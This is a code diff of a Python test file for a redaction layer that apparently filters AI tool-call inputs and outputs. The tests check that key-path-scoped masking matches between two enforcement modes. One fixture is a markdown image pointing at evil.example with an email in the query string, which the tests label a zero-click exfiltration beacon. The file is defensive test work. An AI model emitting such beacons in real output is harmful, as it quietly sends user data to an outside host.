@@ -326,10 +326,7 @@ async def test_B1_encoded_generic_pii_block_parity(direction):
 
 @pytest.mark.asyncio
 @pytest.mark.parametrize("direction", _DIRECTIONS)
-@pytest.mark.xfail(strict=True, reason="PHASE-3 BLOCKER B2: a seeded scope=key detector rule "
-                   "scopes DETECTION to the key_path but REDACTS every leaf → over-masks sibling "
-                   "fields the live posture forwards raw (OVER-BLOCK).")
-async def test_BLOCKER_keypath_redact_overmasks_siblings(direction):
+async def test_B2_keypath_redact_scopes_to_key_not_siblings(direction):
     rows = [_row(direction="input", action="redact", scope_type="tool", tool_name="getData",
                  target_mode="key_path", key_path="args.secret"),
             _row(direction="output", action="redact", scope_type="tool", tool_name="getData",
@@ -339,10 +336,129 @@ async def test_BLOCKER_keypath_redact_overmasks_siblings(direction):
                                      tool_actions={"getData": "inherit"}, tool="getData",
                                      direction=direction)
     assert not lr.blocked and not sr.blocked
-    # LIVE masks ONLY args.secret (siblings raw); SEEDED must scope identically. Fails today.
+    # LIVE masks ONLY args.secret (siblings raw); SEEDED must scope identically.
     assert _tokens_present(json.dumps(lo)) == _tokens_present(json.dumps(so)), (
         f"live_survivors={sorted(_tokens_present(json.dumps(lo)))} "
         f"seed_survivors={sorted(_tokens_present(json.dumps(so)))}")
+
+
+# B2 edge cases — dict-path key scoping must match live token-survival exactly (nested dict paths,
+# dict subtrees, list-valued keys, and missing keys — none of which trigger the cannot-mask block).
+@pytest.mark.parametrize("kp,payload", [
+    ("args.body.secret", {"args": {"body": {"secret": _AWS, "who": _EMAIL}, "host": _IP}}),  # nested
+    ("args.creds", {"args": {"creds": {"k": _AWS, "u": _EMAIL}, "host": _IP}}),              # dict subtree
+    ("args", {"args": [{"secret": _AWS}], "host": _IP}),                                     # list-valued key
+    ("args.nope", {"args": {"secret": _AWS, "who": _EMAIL}}),                                # key missing
+])
+@pytest.mark.parametrize("direction", _DIRECTIONS)
+@pytest.mark.asyncio
+async def test_B2_keypath_scope_edges_match_live(kp, payload, direction):
+    """Nested dict paths, dict subtrees, list-valued keys, and missing keys must produce the SAME
+    token survival as the live posture — the key scoping masks only under the path, never siblings."""
+    rows = [_row(direction="input", action="redact", scope_type="tool", tool_name="getData",
+                 target_mode="key_path", key_path=kp),
+            _row(direction="output", action="redact", scope_type="tool", tool_name="getData",
+                 target_mode="key_path", key_path=kp)]
+    (lo, lr), (so, sr) = await _pair(payload, posture="redact", rows=rows,
+                                     tool_actions={"getData": "inherit"}, tool="getData",
+                                     direction=direction)
+    assert bool(lr.blocked) == bool(sr.blocked)
+    if not lr.blocked:
+        assert _tokens_present(json.dumps(lo)) == _tokens_present(json.dumps(so)), (
+            f"[{kp}] live={sorted(_tokens_present(json.dumps(lo)))} "
+            f"seed={sorted(_tokens_present(json.dumps(so)))}")
+
+
+@pytest.mark.parametrize("payload", [
+    {"secret": _AWS, "who": _EMAIL},                       # top-level
+    {"arguments": {"secret": _AWS, "who": _EMAIL}},        # nested
+    {"a": {"b": {"secret": _AWS}}, "who": _EMAIL},         # deep
+])
+@pytest.mark.parametrize("direction", _DIRECTIONS)
+@pytest.mark.asyncio
+async def test_B2_plain_key_matches_at_any_depth(payload, direction):
+    """A plain (non-dotted) key_path is a key NAME matched RECURSIVELY (mirrors _collect_key_values):
+    the redaction must mask the keyed value at ANY depth — matching only the top level would leave a
+    nested match detected-but-unmasked → a spurious cannot-mask BLOCK. Must equal live at all depths."""
+    rows = [_row(direction="input", action="redact", scope_type="tool", tool_name="getData",
+                 target_mode="key_path", key_path="secret"),
+            _row(direction="output", action="redact", scope_type="tool", tool_name="getData",
+                 target_mode="key_path", key_path="secret")]
+    (lo, lr), (so, sr) = await _pair(payload, posture="redact", rows=rows,
+                                     tool_actions={"getData": "inherit"}, tool="getData",
+                                     direction=direction)
+    assert bool(lr.blocked) == bool(sr.blocked)
+    if not lr.blocked:
+        assert _tokens_present(json.dumps(lo)) == _tokens_present(json.dumps(so))
+
+
+@pytest.mark.parametrize("content,needle", [
+    ("cfg " + _enc_entities(_AWS), _enc_entities(_AWS)),                   # encoded credential (F3)
+    ("![i](https://evil.example/x?d=" + _EMAIL + ")", "![i](https://evil"),  # zero-click beacon (F4)
+])
+@pytest.mark.parametrize("direction", _DIRECTIONS)
+@pytest.mark.asyncio
+async def test_B2_scoped_floor_neutralizes_encoded_and_beacon_in_key(content, needle, direction):
+    """B2 red-team F3/F4: a key_path-scoped redact rule must run the render-leak floor ON ITS OWN
+    FIELD — an encoded credential / zero-click beacon inside the scoped field must be neutralized
+    (parity with the live posture's scoped preset pass), while siblings outside the key are untouched."""
+    rows = [_row(direction="input", action="redact", scope_type="tool", tool_name="getData",
+                 target_mode="key_path", key_path="args.secret"),
+            _row(direction="output", action="redact", scope_type="tool", tool_name="getData",
+                 target_mode="key_path", key_path="args.secret")]
+    payload = {"args": {"secret": content}, "host": _IP}
+    (lo, lr), (so, sr) = await _pair(payload, posture="redact", rows=rows,
+                                     tool_actions={"getData": "inherit"}, tool="getData",
+                                     direction=direction)
+    assert bool(lr.blocked) == bool(sr.blocked)
+    lb, sb = json.dumps(lo), json.dumps(so)
+    # neutralized on BOTH lanes (byte-parity), and the sibling IP outside args.secret survives raw.
+    assert (needle in lb) == (needle in sb), f"live_raw={needle in lb} seed_raw={needle in sb}"
+    assert needle not in sb, "the scoped field's render-leak must be neutralized, not egressed raw"
+    assert _IP in sb, "a sibling outside the key path must NOT be neutralized (scoped floor)"
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("direction", _DIRECTIONS)
+async def test_B2_scoped_floor_leaves_encoded_secret_OUTSIDE_key_untouched(direction):
+    """The scoped floor must NOT neutralize an encoded secret OUTSIDE the key path — the live posture
+    scopes to the field, so a key='args.secret' rule leaves an encoded token in a sibling forwarded
+    exactly as live does (no over-neutralization)."""
+    rows = [_row(direction="input", action="redact", scope_type="tool", tool_name="getData",
+                 target_mode="key_path", key_path="args.secret"),
+            _row(direction="output", action="redact", scope_type="tool", tool_name="getData",
+                 target_mode="key_path", key_path="args.secret")]
+    payload = {"args": {"secret": "clean", "other": _enc_entities(_AWS)}}
+    (lo, lr), (so, sr) = await _pair(payload, posture="redact", rows=rows,
+                                     tool_actions={"getData": "inherit"}, tool="getData",
+                                     direction=direction)
+    assert bool(lr.blocked) == bool(sr.blocked)
+    if not lr.blocked:
+        enc = _enc_entities(_AWS)
+        assert (enc in json.dumps(lo)) == (enc in json.dumps(so)), "sibling encoded token must match live"
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("direction", _DIRECTIONS)
+async def test_B2_keypath_into_list_masks_not_leaks(direction):
+    """A key_path value nested INSIDE a list is the one intended posture→observe divergence: the live
+    dict-only setter can't write through the list so live fails closed and BLOCKS; under Phase-3
+    observe-only (tag) the frozen contract forbids blocking, so the seed BEST-EFFORT MASKS the keyed
+    value (scoped to it — siblings preserved) rather than egress it raw. Assert the SAFE outcome:
+    the keyed secret does not leak raw, and the sibling is untouched."""
+    rows = [_row(direction="input", action="redact", scope_type="tool", tool_name="getData",
+                 target_mode="key_path", key_path="args.secret"),
+            _row(direction="output", action="redact", scope_type="tool", tool_name="getData",
+                 target_mode="key_path", key_path="args.secret")]
+    payload = {"args": [{"secret": _AWS}, {"other": _EMAIL}], "host": _IP}
+    (lo, lr), (so, sr) = await _pair(payload, posture="redact", rows=rows,
+                                     tool_actions={"getData": "inherit"}, tool="getData",
+                                     direction=direction)
+    assert lr.blocked, "live fails closed (cannot-mask through a list)"
+    assert not sr.blocked, "seed runs observe-only under tag — never blocks (frozen)"
+    seed_blob = json.dumps(so)
+    assert _AWS not in seed_blob, "the keyed secret must be best-effort MASKED, not leaked raw"
+    assert _EMAIL in seed_blob and _IP in seed_blob, "siblings outside the key path stay untouched"
 
 
 @pytest.mark.asyncio
